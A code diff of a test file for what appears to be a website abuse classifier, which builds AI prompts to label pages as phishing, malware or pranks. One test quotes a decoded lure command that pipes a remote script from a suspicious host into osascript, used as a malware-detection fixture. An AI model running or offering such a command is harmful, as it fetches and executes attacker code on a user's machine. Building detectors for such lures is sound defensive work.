@@ -1,15 +1,14 @@
 import { expect, test } from "bun:test";
 
 import { buildProviderReportNarrative } from "./abuse/providers/report_payload";
+import { reportableWebsiteHop, websiteSiteAssessments } from "./website_ai";
+import { buildWebsiteAnalysisInput } from "./website_narrative";
 import {
-	buildWebsiteAnalysisInput,
 	buildWebsiteClassificationInput,
 	buildWebsiteReportEvidence,
-	reportableWebsiteHop,
 	validateWebsiteSiteClassification,
 	WEBSITE_CLASSIFICATION_FORMAT,
-	websiteSiteAssessments,
-} from "./website_ai";
+} from "./website_classification";
 import { capturedDocumentContent } from "./website_archive";
 import { extractPasteCommands } from "./malware/paste_commands";
 import type { WebsiteNavigationHop } from "./website_types";
@@ -149,11 +148,10 @@ test("detailed analysis binds the page content to the exact captured URL", () =>
 	const system = input[0].content as string;
 	const text = (input[1].content as Array<{ text: string }>)[0]!.text;
 
-	expect(system).toContain("Never attribute one hop's content");
-	expect(text).toContain(`The page content below belongs only to this final URL: ${finalTrollHop.url}`);
+	expect(system).toContain("never attribute one host's content to another");
+	expect(text).toContain(`The analyzed page is ${finalTrollHop.url}:`);
 	expect(text).toContain(shareGoogleHop.url);
-	expect(text).toContain("Only the analyzed hop's page content is given below");
-	expect(text).toContain("a prank/troll");
+	expect(system).toContain("a prank/troll page");
 	expect(text).toContain("You got trolled");
 });
 
@@ -190,12 +188,10 @@ test("classification covers lures and malware and lists fields beyond the HTML e
 			finding: { enum: ["phishing", "malware", "benign", "prank_or_troll", "insufficient_evidence"] },
 			phishingBasis: { enum: ["credential_theft", "payment_fraud", "none"] },
 			collectionFieldRefs: { type: "array", items: { type: "string" } },
-			continuationRef: { type: "string" },
 			hiddenFrameRef: { type: "string" },
 			mobileHandoff: { type: "boolean" },
-			downloadRef: { type: "string" },
 		},
-		required: ["finding", "phishingBasis", "evidenceQuote", "collectionFieldRefs", "continuationRef", "hiddenFrameRef", "mobileHandoff", "downloadRef"],
+		required: ["finding", "phishingBasis", "evidenceQuote", "collectionFieldRefs", "hiddenFrameRef", "mobileHandoff"],
 	});
 });
 
@@ -489,7 +485,7 @@ test("the classifier reads the whole page and the decoded install command, not a
 	const analysisText = (analysis[1].content as Array<{ text?: string }>)[0]!.text!;
 	expect(analysisText).toContain("2 Run the install command");
 	expect(analysisText).toContain("curl -sfL https://keychainagent.pro/wksxgj/ogZhMJB7F277 | osascript -l JavaScript");
-	expect(analysisText).toContain("distributes malware");
+	expect(analysis[0].content).toContain("malware distribution");
 
 	const classification = buildWebsiteClassificationInput(paneo.hop, { ...paneo.archive });
 	const system = classification[0].content as string;
